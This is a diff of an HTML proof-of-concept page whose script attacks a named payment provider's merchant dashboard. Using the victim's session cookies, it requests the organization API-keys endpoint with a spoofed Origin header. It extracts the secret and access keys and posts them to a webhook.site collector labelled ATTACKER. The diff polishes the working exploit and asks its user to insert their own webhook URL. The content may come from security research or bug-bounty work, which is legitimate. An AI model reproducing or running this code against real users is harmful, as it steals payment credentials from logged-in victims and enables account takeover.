@@ -11,32 +11,35 @@
 
   <script>
     const TARGET = "https://dashboard.rapyd.net/v1/merchants-portal/organization/api-keys";
-    const ATTACKER = "https://webhook.site/#!/view/e03386c2-38b0-434d-8abe-b65ad3561034";
+    const ATTACKER = "https://webhook.site/e03386c2-38b0-434d-8abe-b65ad3561034"; // REPLACE WITH YOUR NEW WEBHOOK URL
     const status = document.getElementById('status');
 
     async function steal() {
       try {
-        status.innerHTML = "Sending Origin: https://ShadowArpit.github.io;
+        status.innerHTML = "Sending Origin: https://ShadowArpit.github.io...";
 
         const response = await fetch(TARGET, {
           method: 'GET',
           credentials: 'include',
           headers: {
             'Accept': 'application/json',
-            'Origin': 'https://ShadowArpit.github.io'  // This gets reflected
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': 'https://ShadowArpit.github.io'
           }
         });
 
         if (!response.ok) {
           const text = await response.text();
-          throw `HTTP ${response.status}: ${text.substring(0, 100)}`;
+          throw new Error(`HTTP ${response.status}: ${text.substring(0, 100)}`);
         }
 
         const data = await response.json();
-        const secret = data.data.organization_secret_key;
-        const access = data.data.organization_access_key;
+        const secret = data.data?.organization_secret_key;
+        const access = data.data?.organization_access_key;
 
-        status.innerHTML = "SECRET STOLEN!";
+        if (!secret || !access) throw new Error("Secret key not found in response");
+
+        status.innerHTML = "SECRET STOLEN! Check webhook.site";
 
         await fetch(ATTACKER, {
           method: 'POST',
@@ -44,14 +47,15 @@
           body: JSON.stringify({
             access_key: access,
             secret_key: secret,
-            poc_url: window.location.href
+            poc_url: window.location.href,
+            timestamp: new Date().toISOString()
           })
         });
 
         console.log("STOLEN:", { access, secret });
       } catch (e) {
-        status.innerHTML = "ERROR: " + e;
-        console.error(e);
+        status.innerHTML = "ERROR: " + e.message;
+        console.error("Exploit error:", e);
       }
     }
 
